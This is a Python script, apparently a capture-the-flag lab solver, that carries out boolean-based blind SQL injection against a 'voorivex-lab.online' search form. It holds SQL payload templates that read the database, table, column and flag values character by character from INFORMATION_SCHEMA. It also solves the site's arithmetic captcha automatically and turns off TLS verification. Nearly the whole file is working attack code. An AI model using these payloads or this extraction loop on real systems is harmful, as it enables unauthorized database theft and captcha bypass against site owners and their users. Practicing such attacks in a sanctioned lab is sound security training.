import re
import requests
from bs4 import BeautifulSoup
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


art = r"""
 __    __                                         
/  |  /  |                                        
$$ |  $$ |  ______    ______    ______   __    __ 
$$ |__$$ | /      \  /      \  /      \ /  |  /  |
$$    $$ | $$$$$$  |/$$$$$$  |/$$$$$$  |$$ |  $$ |
$$$$$$$$ | /    $$ |$$ |  $$/ $$ |  $$/ $$ |  $$ |
$$ |  $$ |/$$$$$$$ |$$ |      $$ |      $$ \__$$ |
$$ |  $$ |$$    $$ |$$ |      $$ |      $$    $$ |
$$/   $$/  $$$$$$$/ $$/       $$/        $$$$$$$ |
                                        /  \__$$ |
                                        $$    $$/ 
                                         $$$$$$/  
"""

print(art)



url = "https://mvb8n9fdym.voorivex-lab.online/index.php"

# Proxy settings
proxies = {
    "http": "http://127.0.0.1:8081",
    "https": "http://127.0.0.1:8081",
}

# Common headers
headers = {
    "Host": "mvb8n9fdym.voorivex-lab.online",
    "Cookie": "PHPSESSID=633063418af0ebb8d2ec6d0d479f89fa",
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Origin": "https://mvb8n9fdym.voorivex-lab.online",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://mvb8n9fdym.voorivex-lab.online/",
}

# Charset for brute-forcing
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"


def get_input():
    """Prompt the user for input and validate the choice."""
    while True:
        menu = (
            "What would you like to extract?\n"
            "[1] Extract the database name\n"
            "[2] Extract the table name\n"
            "[3] Extract the column name\n"
            "[4] Extract the flag\n"
        )
        choice = input(menu + "Enter your choice: ")
        try:
            choice = int(choice)
            if 1 <= choice <= 4:
                get_payload(choice)
                return
            else:
                print("Invalid input! Please enter a number between 1-4.")
        except ValueError:
            print("Invalid input! Please enter a valid number between 1-4.")


def get_payload(choice):
    """Retrieve the appropriate payload based on the menu choice."""
    payloads = {
        1: "' AND (SUBSTRING((SELECT DATABASE()), {position}, 1)='{char}') #",
        2: "' AND (SELECT (SUBSTRING(TABLE_NAME, {position}, 1)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='harry' LIMIT 1) = '{char}' #",
        3: "' AND (SELECT (SUBSTRING(COLUMN_NAME, {position}, 1)) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='harry' AND TABLE_NAME='flag' LIMIT 1) ='{char}' #",
        4: "' AND (SELECT (SUBSTRING(flag_value, {position}, 1)) FROM flag LIMIT 1) ='{char}' #",
    }

    payload = payloads.get(choice)
    if payload:
        result = extract(url, payload)
        print(f"Extracted result: {result}")
    else:
        print("Invalid choice.")


def fetch_and_solve_captcha():
    """Fetch the captcha value from the website and solve it."""
    try:
        response = requests.get(url, timeout=10, headers=headers, proxies=proxies, verify=False)
        if response.status_code != 200:
            print(f"Failed to fetch the page. Status code: {response.status_code}")
            return None, None

        soup = BeautifulSoup(response.text, "html.parser")
        captcha_label = soup.find("label", {"for": "captcha"})
        if not captcha_label:
            print("Captcha label not found!")
            return None, None

        captcha_text = captcha_label.text.strip()
        match = re.search(r"(\d+)\s*\+\s*(\d+)", captcha_text)
        if match:
            num1, num2 = map(int, match.groups())
            return num1 + num2, soup
        else:
            print("Failed to parse captcha.")
            return None, None
    except requests.RequestException as e:
        print(f"Request error: {e}")
        return None, None


def extract(url, payload_template):
    """Extract the data using the provided payload template."""
    result = ""

    try:
        for position in range(1, 50):  # Assuming max length is 50
            found_char = False
            for char in charset:
                captcha_answer, soup = fetch_and_solve_captcha()
                if captcha_answer is None:
                    print("Failed to solve the captcha. Aborting.")
                    return result

                payload = payload_template.format(position=position, char=char)
                data = {
                    "search_title": payload,
                    "captcha": captcha_answer,
                }

                try:
                    response = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=10, verify=False)

                    if response.status_code != 200:
                        print(f"Failed to send POST request. Status code: {response.status_code}")
                        return result

                    # Adjust the success condition to match the actual response
                    if "Number of search results: 8" in response.text:
                        result += char
                        print(f"Found character at position {position}: {char}")
                        found_char = True
                        break
                except requests.RequestException as e:
                    print(f"Request error: {e}")
                    return result

            if not found_char:
                print("Extraction complete.")
                break

    except KeyboardInterrupt:
        print("\nOperation interrupted by user.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

    return result


if __name__ == "__main__":
    get_input()
